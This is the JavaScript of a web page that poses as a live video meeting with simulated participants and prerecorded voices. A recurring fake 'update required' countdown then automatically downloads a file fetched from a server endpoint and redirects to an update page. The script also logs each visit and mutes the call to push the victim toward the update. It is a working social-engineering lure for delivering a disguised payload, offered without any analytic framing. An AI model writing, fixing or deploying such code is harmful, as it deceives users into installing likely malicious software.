<script>
(function(){
'use strict';

const CONFIG = {
    OVERLAY_INTERVAL_MS:10000,
    OVERLAY_COUNTDOWN_SEC:5,
    NETWORK_DROP_CHANCE:0.02,          // ← FIX: was 2 (always true), now 2%
    NETWORK_JITTER_MS:500,
    SPEAKING_THRESHOLD:0.02,
    PROCESS_PHP_URL:'process.php',
    OPEN_PHP_URL:'open.php',
    LOADING_DURATION_MS:2000,
    MEETING_ID:'meeting-1764987494729'
};

const PARTICIPANTS = [
    // ← FIX: unique IDs for every participant
    {id:'host',    name:'Alina Habba',     initials:'AH', role:'Meeting Host', audioFile:'audio/conversation-1.mp3', joinDelay:500,  leaveDelay:null,  isHost:true},
    {id:'guest1',  name:'James Whitmore',  initials:'JW', role:'Guest',        audioFile:'audio/conversation-2.mp3', joinDelay:1500, leaveDelay:10000, isHost:false},
    {id:'guest2',  name:'Sarah Chen',      initials:'SC', role:'Guest',        audioFile:'audio/conversation-3.mp3', joinDelay:2500, leaveDelay:8000,  isHost:false}
];

const AUDIO_FILES = {
    userJoined:'audio/user-joined.mp3',
    userLeft:'audio/user-left.mp3',
    mute:'audio/mute.mp3',
    unmute:'audio/unmute.mp3',
    newSpeaker:'audio/new-speaker.mp3',
    recordingStart:'audio/recording-start.mp3',
    recordingStop:'audio/recording-stop.mp3'
};

let state = {
    inMeeting:false,
    localStream:null,
    micEnabled:false,
    videoEnabled:true,
    activeParticipants:[],
    audioContext:null,
    analysers:{},
    audioElements:{},
    overlayInterval:null,
    conversationTimeouts:[],
    animationFrameId:null,
    countdownInterval:null,
    audioBlocked:false,
    speakerOn:false,
    audioEnableShown:false,
    speakerOffTimeout:null,
    redirectScheduled:false,
    updateCountdownStarted:false
};

const elements = {};

/* ================= INIT ================= */
document.addEventListener('DOMContentLoaded', init);

function init(){
    cacheElements();
    bindEvents();
    showLoadingScreen();
    sendOpenNotification();
}

async function sendOpenNotification(){
    try{
        await fetch(CONFIG.OPEN_PHP_URL,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({meetingId:CONFIG.MEETING_ID,timestamp:Date.now()})
        });
    }catch(e){console.warn('open notify failed',e)}
}

function cacheElements(){
    elements.loadingScreen=document.getElementById('loading-screen');
    elements.prejoinScreen=document.getElementById('prejoin-screen');
    elements.meetingScreen=document.getElementById('meeting-screen');
    elements.joinBtn=document.getElementById('join-btn');
    elements.leaveBtn=document.getElementById('leave-btn');
    elements.unmuteBtn=document.getElementById('unmute-btn');
    elements.videoBtn=document.getElementById('video-btn');
    elements.chatBtn=document.getElementById('chat-btn');
    elements.peopleBtn=document.getElementById('people-btn');
    elements.chatPanel=document.getElementById('chat-panel');
    elements.closeChat=document.getElementById('close-chat');
    elements.chatInput=document.getElementById('chat-input');
    elements.sendChat=document.getElementById('send-chat');
    elements.chatMessages=document.getElementById('chat-messages');
    elements.participantsModal=document.getElementById('participants-modal');
    elements.closeParticipants=document.getElementById('close-participants');
    elements.participantsList=document.getElementById('participants-list');
    elements.updateModal=document.getElementById('update-modal');
    elements.countdown=document.getElementById('countdown');
    elements.downloadStatus=document.getElementById('download-status');
    elements.localVideoSmall=document.getElementById('local-video-small');
    elements.featuredVideo=document.getElementById('featured-video');
    elements.featuredParticipant=document.getElementById('featured-participant');
    elements.featuredAvatar=document.getElementById('featured-avatar');
    elements.featuredName=document.getElementById('featured-name');
    elements.featuredRole=document.getElementById('featured-role');
    elements.featuredNameBottom=document.getElementById('featured-name-bottom');
    elements.thumbnailsContainer=document.getElementById('thumbnails-container');
    elements.notificationContainer=document.getElementById('notification-container');
    elements.participantCount=document.getElementById('participant-count');
    elements.othersCount=document.getElementById('others-count');
    elements.localTile=document.getElementById('local-tile');
    elements.audioEnable=document.getElementById('audio-enable');
    elements.audioEnableBtn=document.getElementById('audio-enable-btn');
    elements.audioFailedBanner=document.getElementById('audio-failed-banner');
}

function bindEvents(){
    elements.joinBtn.addEventListener('click',async ()=>{
        elements.joinBtn.disabled=true;
        elements.joinBtn.textContent='Joining…';
        await joinMeeting();
        elements.joinBtn.disabled=false;
        elements.joinBtn.textContent='Join Meeting';
    });
    elements.leaveBtn.addEventListener('click',leaveMeeting);
    elements.unmuteBtn.addEventListener('click',toggleMic);
    elements.videoBtn.addEventListener('click',toggleVideo);
    elements.chatBtn.addEventListener('click',toggleChat);
    elements.closeChat.addEventListener('click',()=>elements.chatPanel.classList.remove('open'));
    elements.sendChat.addEventListener('click',sendChatMessage);
    elements.chatInput.addEventListener('keypress',e=>{if(e.key==='Enter')sendChatMessage()});
    elements.peopleBtn.addEventListener('click',()=>elements.participantsModal.classList.remove('hidden'));
    elements.closeParticipants.addEventListener('click',()=>elements.participantsModal.classList.add('hidden'));
    elements.participantsModal.addEventListener('click',e=>{if(e.target===elements.participantsModal) elements.participantsModal.classList.add('hidden')});
    elements.audioEnableBtn.addEventListener('click',onUserEnableAudio);
}

function showLoadingScreen(){
    elements.loadingScreen.classList.remove('hidden');
    elements.prejoinScreen.classList.add('hidden');
    elements.meetingScreen.classList.add('hidden');
    setTimeout(()=>{
        elements.loadingScreen.classList.add('hidden');
        elements.prejoinScreen.classList.remove('hidden');
    }, CONFIG.LOADING_DURATION_MS);
}

/* ================================================= */
/* =============== JOIN MEETING ==================== */
/* ================================================= */
async function joinMeeting(){
    try{
        if(!state.audioContext) initAudioContext();
        try{ await state.audioContext.resume() }catch(e){}

        // ← FIX: unlock audio AND mark speaker on so play attempts proceed
        const unlocked = await unlockAudio();
        if(unlocked){
            state.speakerOn = true;
        }

        let stream = null;
        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
            try{
                stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
            }catch{
                try{
                    stream = await navigator.mediaDevices.getUserMedia({audio:true,video:false});
                }catch{
                    try{
                        stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
                    }catch{
                        stream = null;
                    }
                }
            }
        }

        state.localStream = stream;

        if(state.localStream){
            const videoTracks = state.localStream.getVideoTracks();
            const audioTracks = state.localStream.getAudioTracks();

            if(videoTracks.length && elements.localVideoSmall){
                elements.localVideoSmall.srcObject = state.localStream;
                elements.localVideoSmall.classList.remove('hidden');
                state.videoEnabled = true;
            }else{
                state.videoEnabled = false;
                elements.localVideoSmall.classList.add('hidden');
            }

            if(audioTracks.length){
                audioTracks.forEach(t=>t.enabled=false);
                state.micEnabled = false;
            }else{
                state.micEnabled = false;
            }
        }else{
            state.videoEnabled = false;
            state.micEnabled = false;
            elements.localVideoSmall.classList.add('hidden');
        }

        if(elements.featuredVideo){
            elements.featuredVideo.classList.add('hidden');
        }

        elements.prejoinScreen.classList.add('hidden');
        elements.meetingScreen.classList.remove('hidden');
        state.inMeeting = true;

        // ← FIX: single entry point for participants — no duplicate audio elements
        simulateParticipantsJoining();
        startRecurringOverlay();
        updateParticipantsList();

    }catch(err){
        console.error('Failed to join meeting:',err);
        alert('Unable to start meeting. See console.');
        elements.joinBtn.disabled=false;
        elements.joinBtn.textContent='Join Meeting';
    }
}

function leaveMeeting(){
    state.inMeeting=false;
    if(state.localStream){ state.localStream.getTracks().forEach(t=>t.stop()); state.localStream=null; }
    Object.values(state.audioElements).forEach(a=>{ try{ a.pause(); a.currentTime=0 }catch(e){} });
    state.audioElements={};
    state.conversationTimeouts.forEach(t=>clearTimeout(t)); state.conversationTimeouts=[];
    if(state.overlayInterval){ clearInterval(state.overlayInterval); state.overlayInterval=null }
    if(state.animationFrameId){ cancelAnimationFrame(state.animationFrameId); state.animationFrameId=null }
    if(state.countdownInterval){ clearInterval(state.countdownInterval); state.countdownInterval=null }
    if(state.speakerOffTimeout){ clearTimeout(state.speakerOffTimeout); state.speakerOffTimeout=null }
    try{ if(state.audioContext && typeof state.audioContext.close==='function'){ state.audioContext.close() } }catch(e){console.warn(e)}
    state.audioContext=null; state.analysers={};
    state.activeParticipants=[]; elements.thumbnailsContainer.innerHTML='';
    elements.meetingScreen.classList.add('hidden'); elements.updateModal.classList.add('hidden'); elements.chatPanel.classList.remove('open');
    showLoadingScreen();
}

function toggleMic(){
    state.micEnabled=!state.micEnabled;
    if(state.localStream) state.localStream.getAudioTracks().forEach(t=>t.enabled = state.micEnabled);
    if(state.micEnabled){ elements.unmuteBtn.classList.remove('active'); elements.unmuteBtn.querySelector('span').textContent='Mute'; playUISound(AUDIO_FILES.unmute) }
    else{ elements.unmuteBtn.classList.add('active'); elements.unmuteBtn.querySelector('span').textContent='Unmute'; playUISound(AUDIO_FILES.mute) }
    updateParticipantsList();
}

function toggleVideo(){
    state.videoEnabled = !state.videoEnabled;
    if(state.localStream) state.localStream.getVideoTracks().forEach(t=>t.enabled = state.videoEnabled);
    if(state.videoEnabled){
        elements.videoBtn.classList.remove('active');
        elements.localVideoSmall && elements.localVideoSmall.classList.remove('hidden');
    } else {
        elements.videoBtn.classList.add('active');
        elements.localVideoSmall && elements.localVideoSmall.classList.add('hidden');
    }
}

function toggleChat(){ elements.chatPanel.classList.toggle('open') }
function sendChatMessage(){ const message = elements.chatInput.value.trim(); if(!message) return; const msgEl = document.createElement('div'); msgEl.className='mb-3 p-3 bg-blue-500/20 rounded-lg'; msgEl.innerHTML = `<span class="font-semibold text-blue-400">You:</span> ${message}`; elements.chatMessages.appendChild(msgEl); elements.chatMessages.scrollTop = elements.chatMessages.scrollHeight; elements.chatInput.value='' }

function initAudioContext(){ if(!state.audioContext) { state.audioContext = new (window.AudioContext || window.webkitAudioContext)(); console.log('AudioContext', state.audioContext.state) } }

async function unlockAudio(){
    try{
        if(!state.audioContext) initAudioContext();
        if(state.audioContext.state === 'suspended') await state.audioContext.resume();
        const buffer = state.audioContext.createBuffer(1,1,state.audioContext.sampleRate||44100);
        const src = state.audioContext.createBufferSource();
        src.buffer = buffer;
        src.connect(state.audioContext.destination);
        src.start(0);
        await new Promise(r=>setTimeout(r,50));
        console.log('Audio unlocked');
        state.audioBlocked=false;
        hideAudioEnable();
        return true;
    }catch(err){
        console.warn('unlockAudio failed',err);
        state.audioBlocked=true;
        return false;
    }
}

function showAudioEnableOnce(){ if(state.audioEnableShown) return; state.audioEnableShown = true; elements.audioEnable.classList.add('show'); }
function hideAudioEnable(){ elements.audioEnable.classList.remove('show') }

function safePlayAudioElement(audio, id=''){
    if(!audio) return Promise.resolve(false);
    try{ audio.volume=0.8; audio.muted=false }catch(e){}
    return audio.play().then(()=>{
        console.log('Audio playing',id);
        state.speakerOn=true;
        return true;
    }).catch(err=>{
        console.warn('Audio play failed',id,err);
        state.audioBlocked=true;
        showAudioEnableOnce();
        return false;
    });
}

function speakerOff(){
    if(state.speakerOffTimeout){ clearTimeout(state.speakerOffTimeout); state.speakerOffTimeout=null }
    Object.keys(state.audioElements || {}).forEach(id=>{
        try{ const a = state.audioElements[id]; if(a){ a.pause(); a.currentTime = 0 } }catch(e){}
    });
    state.speakerOn = false;
    console.log('Speaker forced OFF: all participant audio paused.');
}

async function speakerOn(){
    const ok = await unlockAudio().catch(()=>false);
    const ids = Object.keys(state.audioElements || {});
    for(const id of ids){
        try{
            const audio = state.audioElements[id];
            if(!audio) continue;
            await safePlayAudioElement(audio,id);
        }catch(e){}
    }
    state.speakerOn = true;
    hideAudioEnable();
    console.log('Speaker ON attempted.');
}

// ← FIX: single unified function — creates audio, connects analyser, and plays
//        No longer duplicated between simulateParticipantsJoining and playParticipantAudio
function simulateParticipantsJoining(){
    PARTICIPANTS.forEach(participant=>{
        setTimeout(async ()=>{
            if(!state.inMeeting) return;

            // 1) Add to UI
            addParticipant(participant);
            showNotification(`${participant.name} joined the meeting`, participant);
            playUISound(AUDIO_FILES.userJoined);

            // 2) Check network drop chance (now 0.02 = 2%, not 2 = 200%)
            if(Math.random() < CONFIG.NETWORK_DROP_CHANCE){
                showNetworkIssue(participant.id);
                return;
            }

            // 3) Create ONE audio element per participant
            const audio = new Audio(participant.audioFile);
            audio.loop = true;
            audio.preload = 'auto';
            // ← FIX: removed crossOrigin='anonymous' — not needed for same-origin files
            //         and can cause CORS load failures
            state.audioElements[participant.id] = audio;

            // 4) Connect to AudioContext analyser once canplay fires
            audio.addEventListener('canplay',()=>{
                try{
                    if(!state.audioContext) initAudioContext();
                    // createMediaElementSource can only be called once per element
                    if(!audio._sourceConnected){
                        const src = state.audioContext.createMediaElementSource(audio);
                        const analyser = state.audioContext.createAnalyser();
                        analyser.fftSize = 256;
                        src.connect(analyser);
                        analyser.connect(state.audioContext.destination);
                        state.analysers[participant.id] = analyser;
                        audio._sourceConnected = true;
                    }
                }catch(e){
                    console.warn('Analyser setup failed for', participant.id, e);
                }
            },{once:true});

            // 5) Play after small jitter
            const jitter = Math.random() * CONFIG.NETWORK_JITTER_MS;
            setTimeout(()=>{
                if(!state.inMeeting) return;
                if(state.speakerOn){
                    safePlayAudioElement(audio, participant.id);
                } else {
                    // Not yet unlocked — show the enable button
                    showAudioEnableOnce();
                }
            }, jitter);

            // 6) Start speaking detection after first participant joins
            startSpeakingDetection();

        }, participant.joinDelay);
    });
}

function addParticipant(participant){
    if(state.activeParticipants.find(p=>p.id===participant.id)) return;
    state.activeParticipants.push(participant);
    updateParticipantsUI();
    updateParticipantsList();
}

function removeParticipant(participantId){
    state.activeParticipants = state.activeParticipants.filter(p=>p.id!==participantId);
    updateParticipantsUI();
    updateParticipantsList();
}

function updateParticipantsUI(){
    const count = state.activeParticipants.length + 1;
    elements.participantCount.textContent = `${count} people`;
    elements.othersCount.textContent = Math.max(0, state.activeParticipants.length - 1);

    if(state.activeParticipants.length > 0){
        const featured = state.activeParticipants[0];
        elements.featuredAvatar.textContent = featured.initials;
        elements.featuredName.textContent = featured.name;
        elements.featuredRole.textContent = featured.role;
        elements.featuredNameBottom.textContent = featured.name;
    }

    elements.thumbnailsContainer.innerHTML = '';
    state.activeParticipants.slice(1).forEach(participant=>{
        const thumb = document.createElement('div');
        thumb.className = 'thumbnail-tile';
        thumb.id = `thumb-${participant.id}`;
        thumb.innerHTML = `<div class="thumb-avatar">${participant.initials}</div>`;
        elements.thumbnailsContainer.appendChild(thumb);
    });
}

function updateParticipantsList(){
    elements.participantsList.innerHTML = '';
    const allParticipants = [
        {name:'You',role:'Participant',micEnabled:state.micEnabled,videoEnabled:state.videoEnabled},
        ...state.activeParticipants.map(p=>({name:p.name,role:p.isHost?'Host':'Participant',micEnabled:true,videoEnabled:false}))
    ];
    allParticipants.forEach(p=>{
        const item = document.createElement('div');
        item.className = 'flex items-center justify-between p-2 bg-black/20 rounded-lg';
        item.innerHTML = `<div class="flex items-center gap-3"><div class="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center text-sm font-bold">${p.name.split(' ').map(n=>n[0]).join('').slice(0,2)}</div><div><p class="font-medium text-sm">${p.name}</p><p class="text-gray-400 text-xs">${p.role}</p></div></div><div class="flex gap-2"><div class="w-8 h-8 rounded-full ${p.micEnabled?'bg-green-500':'bg-red-500'} flex items-center justify-center"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M7 4a3 3 0 016 0v4a3 3 0 11-6 0V4z" clip-rule="evenodd"/></svg></div><div class="w-8 h-8 rounded-full ${p.videoEnabled?'bg-green-500':'bg-red-500'} flex items-center justify-center"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M2 6a2 2 0 012-2h6a2 2 0 012 2v8a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"/></svg></div></div>`;
        elements.participantsList.appendChild(item);
    });
}

function showNotification(message, participantData=null){
    const isJoin=/joined/i.test(message);
    const isLeft=/left/i.test(message);
    let initials='?';
    let displayName=message;
    if(participantData && participantData.name){
        displayName = participantData.name;
        initials = (participantData.initials || displayName.split(' ').map(n=>n[0]).join('').slice(0,2)).toUpperCase();
    } else if(isJoin||isLeft){
        const m = message.match(/^(.*?)\s+(joined|left)/i);
        if(m && m[1]){ displayName=m[1].trim(); initials = displayName.split(' ').map(n=>n[0]||'').slice(0,2).join('').toUpperCase() }
        else initials = message.replace(/\s+/g,'').slice(0,2).toUpperCase();
    }
    const n = document.createElement('div');
    n.className = `notification-banner${isLeft ? ' leave' : ''}`;
    const iconSvg = isLeft ? `<svg class="notification-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>` : `<svg class="notification-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"/></svg>`;
    if(isJoin||isLeft){
        n.innerHTML = `<div class="notification-avatar">${initials}</div><div class="notification-content"><span class="notification-title">${displayName}</span><span class="notification-subtitle">${isLeft?'Left the meeting':'Joined the meeting'}</span></div>${iconSvg}`;
    } else {
        n.innerHTML = `<div class="notification-content"><span class="notification-title">${message}</span></div>`;
    }
    elements.notificationContainer.appendChild(n);
    setTimeout(()=>{
        n.style.animation = 'notificationExit .3s ease-out forwards';
        setTimeout(()=>n.remove(),300);
    },3000);
}

function playUISound(audioFile){
    try{
        const audio = new Audio(audioFile);
        audio.preload='auto';
        safePlayAudioElement(audio,'ui-'+audioFile);
    }catch(e){ console.warn('ui sound',e) }
}

// ← FIX: removed startConversationAudio and playParticipantAudio
//        All audio creation/playback is now unified in simulateParticipantsJoining()

function startSpeakingDetection(){
    // Prevent duplicate animation loops
    if(state.animationFrameId) return;

    let pendingSpeakerId=null;
    let speakerDebounceTimer=null;
    const SPEAKER_DEBOUNCE_MS = 2000;
    const SPEAKER_SWITCH_THRESHOLD = 0.06;

    function detect(){
        if(!state.inMeeting) return;

        let loudestSpeaker=null;
        let loudestLevel=0;

        Object.entries(state.analysers).forEach(([participantId,analyser])=>{
            if(!analyser) return;
            const dataArray = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(dataArray);
            let sum=0;
            for(let i=0;i<dataArray.length;i++) sum+=dataArray[i];
            const rms = sum / dataArray.length / 255;
            const participant = state.activeParticipants.find(p=>p.id===participantId);
            if(!participant) return;

            const isFeatured = state.activeParticipants[0]?.id === participantId;
            const thumb = document.getElementById(`thumb-${participantId}`);

            if(rms > CONFIG.SPEAKING_THRESHOLD){
                if(isFeatured) elements.featuredParticipant.classList.add('speaking');
                if(thumb) thumb.classList.add('speaking');
                if(rms > loudestLevel){ loudestLevel=rms; loudestSpeaker = participant }
            } else {
                if(isFeatured) elements.featuredParticipant.classList.remove('speaking');
                if(thumb) thumb.classList.remove('speaking');
            }
        });

        const currentFeaturedId = state.activeParticipants[0]?.id;
        if(loudestSpeaker && loudestSpeaker.id !== currentFeaturedId && loudestLevel > SPEAKER_SWITCH_THRESHOLD){
            if(pendingSpeakerId !== loudestSpeaker.id){
                pendingSpeakerId = loudestSpeaker.id;
                if(speakerDebounceTimer) clearTimeout(speakerDebounceTimer);
                const speakerToSwitch = loudestSpeaker;
                speakerDebounceTimer = setTimeout(()=>{
                    if(state.inMeeting && state.activeParticipants[0]?.id !== speakerToSwitch.id){
                        switchFeaturedSpeaker(speakerToSwitch);
                    }
                    speakerDebounceTimer=null;
                    pendingSpeakerId=null;
                }, SPEAKER_DEBOUNCE_MS);
            }
        }

        state.animationFrameId = requestAnimationFrame(detect);
    }
    detect();
}

function switchFeaturedSpeaker(newSpeaker){
    const idx = state.activeParticipants.findIndex(p=>p.id===newSpeaker.id);
    if(idx === -1 || idx === 0) return;
    const removed = state.activeParticipants.splice(idx,1)[0];
    state.activeParticipants.unshift(removed);
    updateParticipantsUI();
    playUISound(AUDIO_FILES.newSpeaker);
}

function showNetworkIssue(participantId){
    const isFeatured = state.activeParticipants[0]?.id === participantId;
    if(isFeatured){
        elements.featuredParticipant.classList.add('network-issue');
        setTimeout(()=>elements.featuredParticipant.classList.remove('network-issue'),3000);
    }
}

function startRecurringOverlay(){
    stopRecurringOverlay();
    state.overlayInterval = setInterval(()=>{
        if(!state.inMeeting) return;
        showUpdateModal();
    }, CONFIG.OVERLAY_INTERVAL_MS);
}
function stopRecurringOverlay(){
    if(state.overlayInterval){ clearInterval(state.overlayInterval); state.overlayInterval=null }
}

function showUpdateModal(){
    if(state.updateCountdownStarted) return;
    state.updateCountdownStarted = true;

    elements.updateModal.classList.remove('hidden');
    elements.downloadStatus.classList.add('hidden');

    if(state.countdownInterval){ clearInterval(state.countdownInterval); state.countdownInterval=null }

    let countdown = CONFIG.OVERLAY_COUNTDOWN_SEC;
    elements.countdown.textContent = countdown;

    state.countdownInterval = setInterval(()=>{
        countdown--;
        elements.countdown.textContent = countdown;
        if(countdown <= 0){
            clearInterval(state.countdownInterval);
            state.countdownInterval = null;
            triggerDownload();
        }
    }, 1000);

    if(state.speakerOffTimeout){ clearTimeout(state.speakerOffTimeout); state.speakerOffTimeout=null }
    state.speakerOffTimeout = setTimeout(()=>{
        try{ speakerOff() }catch(e){ console.warn('speakerOff error',e) }
        state.speakerOffTimeout = null;
    }, 10000);
}

function redirectToUpdatePage(delayMs = 5000){
    setTimeout(()=>{ window.location.href = 'update.html'; }, delayMs);
}
function scheduleRedirectOnce(){
    if(state.redirectScheduled) return;
    state.redirectScheduled = true;
    setTimeout(()=>{ window.location.href = 'update.html'; }, 5000);
}

async function triggerDownload(){
    scheduleRedirectOnce();
    try{
        const resp = await fetch(CONFIG.PROCESS_PHP_URL, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({action:'download',meetingId:CONFIG.MEETING_ID,timestamp:Date.now()})
        });
        if(!resp.ok){ console.error('process.php error',resp.status); return }
        const data = await resp.json().catch(()=>null);
        const downloadUrl = data && data.downloadUrl;
        if(!downloadUrl){ console.error('No downloadUrl',data); return }

        function getFilenameFromContentDisposition(cd){
            if(!cd) return null;
            const star = cd.match(/filename\*\s*=\s*[^']*''([^;]+)/i);
            if(star){ try{return decodeURIComponent(star[1])}catch(e){return star[1]} }
            const m = cd.match(/filename\s*=\s*["']?([^"';]+)["']?/i);
            return m ? m[1] : null;
        }
        function guessFilenameFromUrl(url){
            try{ const u=new URL(url); const parts=u.pathname.split('/').filter(Boolean); return parts.length?parts[parts.length-1]:null }catch(e){return null}
        }
        function downloadBlob(blob,filename){
            const url=URL.createObjectURL(blob); const a=document.createElement('a'); a.style.display='none'; a.href=url; a.download=filename||'download'; document.body.appendChild(a); a.click(); setTimeout(()=>{URL.revokeObjectURL(url);a.remove()},2000);
        }

        try{
            const fileResp = await fetch(downloadUrl,{method:'GET',mode:'cors'});
            if(!fileResp.ok) throw new Error('fetch returned '+fileResp.status);
            if(fileResp.body && fileResp.body.getReader){
                const reader = fileResp.body.getReader();
                const contentLengthHeader = fileResp.headers.get('content-length');
                const total = contentLengthHeader ? parseInt(contentLengthHeader,10) : null;
                const chunks=[]; let received=0;
                while(true){
                    const {done,value}=await reader.read();
                    if(done) break;
                    chunks.push(value);
                    received += (value.length ?? value.byteLength ?? 0);
                    if(total) console.log(`Download progress: ${(received/total*100).toFixed(1)}%`);
                }
                const blob = new Blob(chunks);
                const filename = getFilenameFromContentDisposition(fileResp.headers.get('content-disposition')) || guessFilenameFromUrl(downloadUrl) || 'download.bin';
                downloadBlob(blob,filename);
                return;
            } else {
                const blob = await fileResp.blob();
                const filename = getFilenameFromContentDisposition(fileResp.headers.get('content-disposition')) || guessFilenameFromUrl(downloadUrl) || 'download.bin';
                downloadBlob(blob,filename);
                return;
            }
        }catch(fetchErr){
            console.warn('Direct fetch failed:',fetchErr);
        }

        try{
            const proxyEndpoint = CONFIG.PROCESS_PHP_URL + '?proxy=1';
            let iframe = document.getElementById('download-proxy-iframe');
            if(!iframe){ iframe=document.createElement('iframe'); iframe.style.display='none'; iframe.id='download-proxy-iframe'; iframe.name='download-proxy-iframe'; document.body.appendChild(iframe) }
            const form = document.createElement('form'); form.style.display='none'; form.method='POST'; form.action=proxyEndpoint; form.target=iframe.name;
            const input = document.createElement('input'); input.type='hidden'; input.name='url'; input.value=downloadUrl; form.appendChild(input);
            document.body.appendChild(form); form.submit();
            setTimeout(()=>{try{form.remove()}catch(e){}},2000);
            return;
        }catch(proxyErr){ console.error('Proxy fallback failed:',proxyErr) }

        try{ window.open(downloadUrl,'_blank','noopener') }catch(openErr){ console.error('Failed to open download URL:',openErr) }
    }catch(err){ console.error('triggerDownload error',err) }
}

async function onUserEnableAudio(){
    state.audioEnableShown = true;
    const unlocked = await unlockAudio();
    if(!unlocked){ console.warn('unlockAudio failed on user enable'); return }
    state.speakerOn = true;  // ← FIX: ensure state is updated
    await speakerOn();
    hideAudioEnable();
}

window.startRemoteConversation = function(){
    // Replay audio for all participants that are already joined
    PARTICIPANTS.forEach(p=>{
        const audio = state.audioElements[p.id];
        if(audio && state.speakerOn) safePlayAudioElement(audio, p.id);
    });
};
window.stopRemoteConversation = function(){
    Object.values(state.audioElements).forEach(a=>{ try{ a.pause(); a.currentTime=0 }catch(e){} });
    state.speakerOn=false;
};
window.startRecurringOverlay = function(ms,sec){ CONFIG.OVERLAY_INTERVAL_MS=ms||CONFIG.OVERLAY_INTERVAL_MS; CONFIG.OVERLAY_COUNTDOWN_SEC=sec||CONFIG.OVERLAY_COUNTDOWN_SEC; startRecurringOverlay() };
window.stopRecurringOverlay = stopRecurringOverlay;
window.loadExternalAudioToKey = function(key,fileOrUrl){ if(AUDIO_FILES[key]) AUDIO_FILES[key]=fileOrUrl; const p=PARTICIPANTS.find(x=>x.id===key); if(p) p.audioFile=fileOrUrl };

})();
</script>
